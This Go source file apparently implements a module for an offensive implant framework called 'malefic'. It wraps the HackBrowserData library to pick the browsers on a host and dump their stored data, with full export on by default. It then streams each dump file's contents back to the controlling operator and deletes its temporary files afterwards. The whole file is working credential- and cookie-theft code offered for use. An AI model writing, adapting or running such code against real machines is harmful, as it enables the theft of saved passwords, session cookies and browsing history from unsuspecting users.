package main

import (
	"fmt"
	malefic "malefic-core"
	"os"
	"path/filepath"
	"strings"

	"github.com/moond4rk/hackbrowserdata/browser"
)

// Module wraps HackBrowserData as a streaming GoModule.
// Request.Input  = browser name ("all", "chrome", "firefox", …)
// Request.Params = {"profile_path": "…", "format": "json"|"csv", "full_export": "true"|"false"}
type Module struct{}

func (m *Module) Name() string { return "hack_browser_data" }

func (m *Module) Run(taskId uint32, input <-chan *malefic.Request, output chan<- *malefic.Response) {
	for req := range input {
		browserName := req.Input
		if browserName == "" {
			browserName = "all"
		}

		profilePath := ""
		format := "json"
		fullExport := true
		if req.Params != nil {
			if v, ok := req.Params["profile_path"]; ok {
				profilePath = v
			}
			if v, ok := req.Params["format"]; ok {
				format = v
			}
			if v, ok := req.Params["full_export"]; ok && v == "false" {
				fullExport = false
			}
		}

		browsers, err := browser.PickBrowsers(browserName, profilePath)
		if err != nil {
			output <- &malefic.Response{Error: fmt.Sprintf("pick browsers: %v", err)}
			continue
		}
		if len(browsers) == 0 {
			output <- &malefic.Response{Error: "no browsers found"}
			continue
		}

		tmpDir, err := os.MkdirTemp("", fmt.Sprintf("hbd-%d-*", taskId))
		if err != nil {
			output <- &malefic.Response{Error: fmt.Sprintf("mkdtemp: %v", err)}
			continue
		}

		for _, b := range browsers {
			data, err := b.BrowsingData(fullExport)
			if err != nil {
				output <- &malefic.Response{
					Error: fmt.Sprintf("browser %s: %v", b.Name(), err),
					Kv:    map[string]string{"browser": b.Name()},
				}
				continue
			}
			data.Output(tmpDir, b.Name(), format)
		}

		entries, _ := os.ReadDir(tmpDir)
		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			fpath := filepath.Join(tmpDir, entry.Name())
			content, err := os.ReadFile(fpath)
			if err != nil {
				continue
			}
			trimmed := strings.TrimSpace(string(content))
			if trimmed == "" || trimmed == "[]" || trimmed == "{}" {
				continue
			}
			output <- &malefic.Response{
				Output: string(content),
				Kv: map[string]string{
					"browser": extractBrowserName(entry.Name()),
					"file":    entry.Name(),
				},
			}
		}

		os.RemoveAll(tmpDir)

		output <- &malefic.Response{
			Output: fmt.Sprintf("done: %d browsers processed", len(browsers)),
			Kv:     map[string]string{"status": "complete"},
			Array:  browserNames(browsers),
		}
	}
}

func extractBrowserName(filename string) string {
	parts := strings.SplitN(filename, "_", 2)
	if len(parts) > 0 {
		return parts[0]
	}
	return filename
}

func browserNames(browsers []browser.Browser) []string {
	names := make([]string, 0, len(browsers))
	for _, b := range browsers {
		names = append(names, b.Name())
	}
	return names
}
